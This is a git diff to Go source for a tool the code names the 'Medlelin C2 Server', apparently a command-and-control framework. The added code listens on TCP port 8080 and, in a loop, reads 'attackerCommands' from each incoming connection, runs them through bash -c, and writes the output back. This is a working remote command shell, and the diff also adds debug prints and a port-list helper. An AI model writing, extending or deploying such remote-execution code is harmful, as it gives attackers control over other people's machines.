@@ -7,7 +7,9 @@ package cmd
 import (
 	"bufio"
 	"fmt"
+	"log"
 	"net"
+	"os/exec"
 	"strconv"
 	"strings"
 
@@ -64,8 +66,11 @@ func listenForConnections() {
 	println("Medlelin C2 Server Successfully Started...")
 	println("The open ports are: " + data.GetListenerPorts())
 	checkListenerPorts()
+	print("the length of checkListenerPorts is :")
+	fmt.Println(len(checkListenerPorts()))
 
 	l, err := net.Listen("tcp4", ":8080")
+
 	if err != nil {
 		fmt.Println(err)
 		return
@@ -73,20 +78,32 @@ func listenForConnections() {
 	defer l.Close()
 
 	for {
-		c, err := l.Accept()
+		connection, err := l.Accept()
 		if err != nil {
 			fmt.Println(err)
 			return
 		}
-		go handleConnection(c)
+		go handleConnection(connection)
 		count++
+
+		for {
+			attackerCommands, _ := bufio.NewReader(connection).ReadString('\n')
+			cmd := exec.Command("bash", "-c", attackerCommands)
+			if err != nil {
+				log.Fatalln(err)
+			}
+			out, _ := cmd.CombinedOutput()
+
+			connection.Write(out)
+		}
 	}
+
 }
 
 //Function to parse listener's ports for active listeners in the database.
-func checkListenerPorts() {
+func checkListenerPorts() []string {
 	//use the strings.Split function to split a string into its comma separated values
 	portList := strings.Split(data.GetListenerPorts(), ",")
-
-	fmt.Println(portList[0])
+	return portList
+	//fmt.Println(portList)
 }
